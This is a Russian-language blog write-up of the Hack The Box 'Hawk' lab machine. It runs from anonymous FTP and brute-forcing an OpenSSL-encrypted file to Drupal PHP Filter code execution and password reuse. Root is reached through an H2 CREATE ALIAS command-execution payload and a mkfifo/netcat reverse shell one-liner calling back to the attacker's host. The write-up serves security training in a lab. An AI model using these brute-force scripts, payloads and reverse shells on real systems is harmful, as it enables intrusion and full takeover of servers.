---
layout: post
title: "HTB{ Hawk }"
date: 2018-12-09 02:00:00 +0300
author: snovvcrash
categories: ctf write-ups boxes hackthebox
tags: [ctf, write-ups, boxes, hackthebox, Hawk, linux, ftp, openssl, drupal, php, php-filter, password-reuse, ssh-tunneling, h2]
comments: true
published: true
---

**Hawk** — "разнообразная" виртуалка на Linux, предлагающая целый спектр задач из самых разных областей: здесь тебе и подбор пароля для *OpenSSL*-шифрованного сообщения, и использование модуля "PHP Filter" в CMS *Drupal* для выполнения произвольного PHP-кода (и получения reverse-shell'а), и выявление проблемы повторного использования паролей. Последняя приведет к получению доступа к SSH и СУБД *H2*: будем пробрасывать SSH-туннель, чтобы подключиться к базе данных и выполнить системные команды через абьюзинг функционала CREATE ALIAS от имени суперпользователя. Вначале прочитаем флаг, а затем получим полноценный шелл, и таким образом повысим привилегия в системе. **Сложность: 4.8/10**{:style="color:grey;"}

<!--cut-->

{: .center-image}
[![hawk-banner.png]({{ "/img/htb/boxes/hawk/hawk-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/146 "Hack The Box :: Hawk")

{: .center-image}
![hawk-info.png]({{ "/img/htb/boxes/hawk/hawk-info.png" | relative_url }})

* TOC
{:toc}

# Nmap
Initial:
```text
root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.102
...
```

```text
root@kali:~# cat nmap/initial.nmap
# Nmap 7.70 scan initiated Sat Dec  8 22:09:46 2018 as: nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.102
Nmap scan report for 10.10.10.102
Host is up, received user-set (0.14s latency).
Scanned at 2018-12-08 22:09:46 MSK for 0s
Not shown: 996 closed ports
Reason: 996 resets
PORT     STATE SERVICE         REASON
21/tcp   open  ftp             syn-ack ttl 63
22/tcp   open  ssh             syn-ack ttl 63
80/tcp   open  http            syn-ack ttl 63
8082/tcp open  blackice-alerts syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Dec  8 22:09:46 2018 -- 1 IP address (1 host up) scanned in 0.70 seconds
```

Version ([красивый отчет]({{ "/nmap/htb-hawk-nmap-version.html" | relative_url }})):
```text
root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/misc/nmap-bootstrap.xsl -p21,22,80,8082 10.10.10.102
...
```

```text
root@kali:~# cat nmap/version.nmap
# Nmap 7.70 scan initiated Sat Dec  8 22:10:30 2018 as: nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/misc/nmap-bootstrap.xsl -p21,22,80,8082 10.10.10.102
Nmap scan report for 10.10.10.102
Host is up, received echo-reply ttl 63 (0.14s latency).
Scanned at 2018-12-08 22:10:31 MSK for 19s

PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBj1TNZ7AO3WSpSMz0UoHlGmWQRlvXcyMXMRhDJ8X+9kZZGKkdXxWcDAu/OvUXdwCKVY+YjPPY8wi+jqKIQXlgICA3MEcg3RlLoHPTUh6KFmPxlT7Heaca7xSJ+BnhFxYF+bhhiaHgcaK8qlZFc9qS2Un3oNS6VDAAHOx2p4FU8OVM/yuik9qt6nxAQVS/v3mZfpVUm3HKOOcfXzyZEZAwrAWHk+2Y2yCBUUY1AmCMed566BfmeEOYXJU18I92fsSOhuzTt7tqX4u66SO1cyLTJczSA7gF42K8O+VPyn3pWnLmMBnAcZS0KbMUKVPa3UBSScxl5nLlSFRyJ1rCBxs7
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM0hCdwqpZ6zvQpLiZ5/tsUDQeVMEXicRx6H8AOW8lyzsHJrrQWgqM1vo5jKUn+bMazqzZ1SbP8QJ3JDS2/SlHs=
|   256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3kNN27mM1080x8c4aOWptSRg6yN21uBMSQiKk1PrsP
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
8082/tcp open  http    syn-ack ttl 63 H2 database http console
|_http-favicon: Unknown favicon MD5: 8EAA69F8468C7E0D3DFEF67D5944FF4D
| http-methods: 
|_  Supported Methods: GET POST
|_http-title: H2 Console
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec  8 22:10:50 2018 -- 1 IP address (1 host up) scanned in 19.78 seconds
```

Много всего: FTP (21), SSH (22), веб (80) и консоль Java-based СУБД [H2](https://ru.wikipedia.org/wiki/H2 "H2 — Википедия") (8082). В этот раз начнем с обследования FTP-сервера.

# FTP — Порт 21
Посмотрим, что есть на FTP. Коннектимся:
```text
root@kali:~# ftp 10.10.10.102
Connected to 10.10.10.102.
220 (vsFTPd 3.0.3)
Name (10.10.10.102:root): EV1LH4CK3R
530 This FTP server is anonymous only.
Login failed.
ftp>
```

Только анонимный доступ — окей:
```text
ftp> user
(username) anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Осматриваемся:
```text
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
226 Directory send OK.
ftp> cd messages
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 .
drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 ..
-rw-r--r--    1 ftp      ftp           240 Jun 16 22:21 .drupal.txt.enc
226 Directory send OK.
ftp>
```

Нашли скрытый файл `.drupal.txt.enc`. Заберем к себе на машину и встретимся в следующим параграфе:
```text
ftp> get .drupal.txt.enc
local: .drupal.txt.enc remote: .drupal.txt.enc
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).
226 Transfer complete.
240 bytes received in 0.00 secs (642.1233 kB/s)
ftp> 221 Goodbye.
```

# .drupal.txt.enc
Итак, имеем загадочный файл, вытащенный с FTP-сервера. Посмотрим, что это:
```text
root@kali:~# file .drupal.txt.enc
.drupal.txt.enc: openssl enc'd data with salted password, base64 encoded
```
```text
root@kali:~# cat .drupal.txt.enc
U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=
```
```text
root@kali:~# cat .drupal.txt.enc | base64 -d
Salted__kY ԓi-6l7Z>{$p5 2[
8?sWj#T$3AG,f   Z\ja>>G6
.EÐVV@ɗ4@wxZNiPtF`)
```
```text
root@kali:~# cat .drupal.txt.enc | base64 -d > .drupal.enc
root@kali:~# wc -c .drupal.enc
176 .drupal.enc
```

Выяснили: полученный файл зашифрован блочным шифром (на что намекает размер в 176 байт, который делится на 8) с помощью пакета OpenSSL (на что намекает префикс `Salted__`).

Отсюда есть разные пути развития событий. Например:
1. Используем многопоточную утилиту [bruteforce-salted-openssl](https://github.com/glv2/bruteforce-salted-openssl "glv2/bruteforce-salted-openssl: Try to find the password of a file that was encrypted with the 'openssl' command.") для восстановления пароля, надеясь на то, что он словарный.
2. Пишем собственный брутер, и так же пробуем отыскать пароль, уповая на его простоту.

И в первом, и во втором случае для начала предстоит угадать алгоритм шифрования и хеш-функцию, использованные при шифровании файла. Рассмотрим оба решения.

## 1-й способ: bruteforce-salted-openssl.py
Синтаксис утилиты простой:
```text
bruteforce-salted-openssl -f <WORDLIST> -t <NUM_OF_THREADS> <ENCRYPTED_FILE> -c <CIPHER_ALG> -d <HASH_FUNC>
```

, где:
* `-f <WORDLIST>` — используемый словарь;
* `-t <NUM_OF_THREADS>` — количество потоков;
* `<ENCRYPTED_FILE>` — файл, который мы восстанавливаем;
* `-c <CIPHER_ALG>` — алгоритм шифрования;
* `-d <HASH_FUNC>` — хеш-функция.

С помощью команд `openssl list -cipher-algorithms` и `openssl list -digest-algorithms` выведем список поддерживаемых OpenSSL алгоритмов шифрования и хеширования соответственно и набросаем простой Python-скрипт, который будет вызывать утилиту *bruteforce-salted-openssl* с каждой парой "алгоритм_шфирования / алгоритм_хеширования":
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from subprocess import check_output, STDOUT
from itertools import product

CIPHERS = [
  'AES-128-CBC',
  'AES-128-CBC-HMAC-SHA1',
  'AES-128-CBC-HMAC-SHA256',
  'AES-128-CFB',
  'AES-128-CFB1',
  'AES-128-CFB8',
  'AES-128-CTR',
  'AES-128-ECB',
  'AES-128-OCB',
  'AES-128-OFB',
  'AES-128-XTS',
  'AES-192-CBC',
  'AES-192-CFB',
  'AES-192-CFB1',
  'AES-192-CFB8',
  'AES-192-CTR',
  'AES-192-ECB',
  'AES-192-OCB',
  'AES-192-OFB',
  'AES-256-CBC',
  'AES-256-CBC-HMAC-SHA1',
  'AES-256-CBC-HMAC-SHA256',
  'AES-256-CFB',
  'AES-256-CFB1',
  'AES-256-CFB8',
  'AES-256-CTR',
  'AES-256-ECB',
  'AES-256-OCB',
  'AES-256-OFB',
  'AES-256-XTS',
  'AES128',
  'AES192',
  'AES256',
  'BF',
  'BF-CBC',
  'BF-CFB',
  'BF-ECB',
  'BF-OFB',
  'CAMELLIA-128-CBC',
  'CAMELLIA-128-CFB',
  'CAMELLIA-128-CFB1',
  'CAMELLIA-128-CFB8',
  'CAMELLIA-128-CTR',
  'CAMELLIA-128-ECB',
  'CAMELLIA-128-OFB',
  'CAMELLIA-192-CBC',
  'CAMELLIA-192-CFB',
  'CAMELLIA-192-CFB1',
  'CAMELLIA-192-CFB8',
  'CAMELLIA-192-CTR',
  'CAMELLIA-192-ECB',
  'CAMELLIA-192-OFB',
  'CAMELLIA-256-CBC',
  'CAMELLIA-256-CFB',
  'CAMELLIA-256-CFB1',
  'CAMELLIA-256-CFB8',
  'CAMELLIA-256-CTR',
  'CAMELLIA-256-ECB',
  'CAMELLIA-256-OFB',
  'CAMELLIA128',
  'CAMELLIA192',
  'CAMELLIA256',
  'CAST',
  'CAST-cbc',
  'CAST5-CBC',
  'CAST5-CFB',
  'CAST5-ECB',
  'CAST5-OFB',
  'ChaCha20',
  'ChaCha20-Poly1305',
  'DES',
  'DES-CBC',
  'DES-CFB',
  'DES-CFB1',
  'DES-CFB8',
  'DES-ECB',
  'DES-EDE',
  'DES-EDE-CBC',
  'DES-EDE-CFB',
  'DES-EDE-ECB',
  'DES-EDE-OFB',
  'DES-EDE3',
  'DES-EDE3-CBC',
  'DES-EDE3-CFB',
  'DES-EDE3-CFB1',
  'DES-EDE3-CFB8',
  'DES-EDE3-ECB',
  'DES-EDE3-OFB',
  'DES-OFB',
  'DES3',
  'DESX',
  'DESX-CBC',
  'RC2',
  'RC2-40-CBC',
  'RC2-64-CBC',
  'RC2-CBC',
  'RC2-CFB',
  'RC2-ECB',
  'RC2-OFB',
  'RC4',
  'RC4-40',
  'RC4-HMAC-MD5',
  'SEED',
  'SEED-CBC',
  'SEED-CFB',
  'SEED-ECB',
  'SEED-OFB'
]

DIGESTS = [
  'BLAKE2b512',
  'BLAKE2s256',
  'MD4',
  'MD5',
  'MD5-SHA1',
  'RIPEMD160',
  'RSA-MD4',
  'RSA-MD5',
  'RSA-RIPEMD160',
  'RSA-SHA1',
  'RSA-SHA1-2',
  'RSA-SHA224',
  'RSA-SHA256',
  'RSA-SHA384',
  'RSA-SHA512',
  'SHA1',
  'SHA224',
  'SHA256',
  'SHA384',
  'SHA512',
  'sha512WithRSAEncryption',
  'ssl3-md5',
  'ssl3-sha1',
  'whirlpool'
]

for c, d in product(*[CIPHERS, DIGESTS]):
  cmd = ['bruteforce-salted-openssl', '-f', '/usr/share/wordlists/dirb/common.txt', '-t', '6', './.drupal.enc', '-c', c, '-d', d]
  out = check_output(cmd, stderr=STDOUT)
  if b'Password not found' not in out:
    print(c, d)
    print(out.decode('utf-8'))
    break
```

Запустим написанное и через несколько секунд:
```text
root@kali:~# python3 bruteforce-salted-openssl.py
AES-256-CBC RSA-SHA256
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 1701
Tried passwords per second: inf
Last tried password: friends

Password candidate: friends
```

Получаем предполагаемый пароль `friends` и расшифровываем им сообщение:
```text
root@kali:~# openssl enc -d -aes256 -in .drupal.enc -k friends
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department
```

## 2-й способ: openssl.py
Облегчим себе немного жизнь, сделав предположение, что используемый алгоритм шифрования — это AES-256.

Тогда написание собственного тривиального брутера по словарю и вовсе займет 15 строк:
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import string

with open('/usr/share/wordlists/dirb/common.txt', 'r') as wordlist:
  for word in wordlist:
    password = word.strip()
    cmd = ['openssl', 'enc', '-d', '-aes256', '-in', './.drupal.enc', '-k', password]
    try:
      out = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
      if all(chr(c) in string.printable for c in out):
        print(password)
        print(out.decode('utf-8'))
        break
    except subprocess.CalledProcessError:
      pass
```

Запустим и по окончании работы получим расшифрованное сообщение:
```text
root@kali:~# python3 openssl.py
friends
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department
```

# Web — Порт 80
А на `http://10.10.10.102:80` у нас... СMS Drupal :open_mouth:

[![hawk-port80-browser-1.png]({{ "/img/htb/boxes/hawk/hawk-port80-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port80-browser-1.png" | relative_url }})

После выяснения, какие пользователи существуют в CMS (через абьюзинг формы регистрации), логинимся с кредами `admin:PencilKeyboardScanner123` и попадаем в админку. Оттуда после небольшой разведки выясняем, что в системе управления содержимым установлен модуль "PHP Filter", что дает нам возможность выполнения произвольного PHP-кода на сервере.

Для этого активируем модуль, настраиваем [php-reverse-shell](https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/laudanum-0.8/php/php-reverse-shell.php "SecLists/php-reverse-shell.php at master · danielmiessler/SecLists"), создаем новую статью на сайте (с указанием того, что содержимое статьи есть PHP-код), копируем туда наш шелл и активируем предпросмотр содержимого кнопкой "Preview", предварительно подняв локальный листенер у себя на машине.

Вот, как все выглядело в картинках:

[![hawk-port80-browser-2.png]({{ "/img/htb/boxes/hawk/hawk-port80-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port80-browser-2.png" | relative_url }})

[![hawk-port80-browser-3.png]({{ "/img/htb/boxes/hawk/hawk-port80-browser-3.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port80-browser-3.png" | relative_url }})

[![hawk-port80-browser-4.png]({{ "/img/htb/boxes/hawk/hawk-port80-browser-4.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port80-browser-4.png" | relative_url }})

# Drupal Reverse-Shell (внутри машины)
Получив отклик на листенер, апгрейдим шелл до полноценного PTY'я, [как я показывал как-то раз на форуме HTB](https://forum.hackthebox.eu/discussion/comment/22312/#Comment_22312 "Obtaining a Fully Interactive Shell — Hack The Box :: Forums"), и мы внутри:
```text
www-data@hawk:/$ whoami
www-data
www-data@hawk:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@hawk:/$ uname -a
Linux hawk 4.15.0-23-generic #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

Сразу читаем флаг юзера, т. к. он доступен всем на чтение:
```text
www-data@hawk:/home/daniel$ ls -l user.txt
-rw-r--r-- 1 daniel daniel 33 Jun 16 22:30 /home/daniel/user.txt
```

## user.txt
```text
www-data@hawk:/home/daniel$ cat user.txt
d5111d4f75370ebd01cdba5b32e202a8
```

## PrivEsc: www-data → daniel (Password Reuse)
После небольшой прогулки по системе мое внимание привлек файл с настройками CMS `/var/www/html/sites/default/settings.php`. Поищем в нем пароли:
```text
www-data@hawk:/var/www/html/sites/default$ cat settings.php | grep -v '*' | grep -n password
11:      'password' => 'drupal4hawk',
76:# $conf['proxy_password'] = '';
```

Попробуем авторизоваться под юзером `daniel` с паролем `drupal4hawk`:
```text
www-data@hawk:/var/www/html/sites/default$ su daniel
Password: drupal4hawk
Python 3.6.5 (default, Apr  1 2018, 05:46:30)
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>>
```

Успешно! Только вот Python в качестве login-шелла? Странный выбор, ну да ладно, выбраться в bash отсюда так же легко, как:
```text
>>> import os
>>> os.system('bash')
daniel@hawk:/var/www/html/sites/default$ cd
daniel@hawk:~$ pwd
/home/daniel
```
```text
daniel@hawk:~$ whoami
daniel
daniel@hawk:~$ id
uid=1002(daniel) gid=1005(daniel) groups=1005(daniel)
```

В поисках следующего PrivEsc'а посмотрим на запущенные процессы:
```text
daniel@hawk:~$ ps auxww
...
root        794  0.0  0.0   4628   872 ?        Ss   Dec07   0:00 /bin/sh -c /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar
root        795  0.1 13.7 2351068 135272 ?      Sl   Dec07   1:34 /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar
...
```

И вспомним, что мы еще не смотрели 8082-й порт СУБД H2, найденный nmap'ом. Исправим это упущение.

# Web — Порт 8082
Перейдя по `http://10.10.10.102:8082` нас ждет сообщение:

[![hawk-port8082-browser-1.png]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-1.png" | relative_url }})

Как и обещал nmap — это веб-консоль базы H2.

> Удаленные соединения запрещены.

говорит она, поэтому логично предположить, что разрешены локальные :neckbeard:

Поэтому прокинем SSH-туннель и рассмотрим БД поподробнее.

# PrivEsc: daniel → root (H2)
## Веб-консоль
Поднимем локальный SSH-туннель:
```text
root@kali:~# sshpass -p 'drupal4hawk' ssh -oStrictHostKeyChecking=no -L 8082:127.0.0.1:8082 daniel@10.10.10.102

```

И попробуем авторизоваться в веб-консоле H2, которая поселилась по адресу `http://127.0.0.1:8082`:

[![hawk-port8082-browser-2.png]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-2.png" | relative_url }})

Подключиться к БД `jdbc:h2:~/test` не удалось, т. к. она **существует и** мы не знаем нужных кредов. Но вот если попробовать присоединиться к **несуществующей** базе, то она автоматически будет создана, и залогиниться можно будет с кредами по умолчанию `sa:`:

[![hawk-port8082-browser-3.png]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-3.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-3.png" | relative_url }})

Есть контакт, и мы внутри.

## CREATE ALIAS
Есть не один способ эскалации привилегий с помощью инструментария H2, но в рамках данного райтапа мы остановимся на выполнении произвольного кода через создание функций с помощью `CREATE ALIAS`. В [этом](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html "Gambler - Hacking and other stuffs") посте хорошо описан этот метод.

Для начала создадим такой алиас:
```text
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('cat /root/root.txt')
```

И заберем root-флаг:

### root.txt

[![hawk-port8082-browser-4.png]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-4.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-4.png" | relative_url }})

И напоследок, чтобы с чистой совестью отправить эту машину в утиль, получим root-сессию. Сделать это почти так же просто — для этого сперва создадим bash-reverse-shell на машине-жертве (чтобы не мучаться с "плохими" символами в веб-консоли):
```text
daniel@hawk:~$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 8881 >/tmp/f' > .sh3ll.sh
```

После чего запустим этот шелл, слушая при этом 8881-й порт:

[![hawk-port8082-browser-5.png]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-5.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-5.png" | relative_url }})

```text
root@kali:~# nc -lvnp 8881
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8881
Ncat: Listening on 0.0.0.0:8881
Ncat: Connection from 10.10.10.102.
Ncat: Connection from 10.10.10.102:35130.
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
54f3e840????????????????????????
```

Приручайте ястребов, спасибо за внимание :innocent:

{: .center-image}
![hawk-owned-user.png]({{ "/img/htb/boxes/hawk/hawk-owned-user.png" | relative_url }})

{: .center-image}
![hawk-owned-root.png]({{ "/img/htb/boxes/hawk/hawk-owned-root.png" | relative_url }})

{: .center-image}
![hawk-trophy.png]({{ "/img/htb/boxes/hawk/hawk-trophy.png" | relative_url }})
